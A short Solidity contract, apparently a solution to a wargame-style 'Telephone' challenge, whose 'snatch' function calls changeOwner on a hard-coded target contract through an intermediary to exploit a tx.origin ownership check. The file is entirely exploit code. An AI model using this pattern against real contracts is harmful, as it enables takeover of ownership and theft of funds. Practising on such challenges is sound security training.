// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract Telebone {

  address public telephone = 0xD9957869ddDd2D8F525e31e5934168Dd13239c09;

  constructor() public {
  }

  function snatch() public {
    Telephone(telephone).changeOwner(msg.sender);
  }
}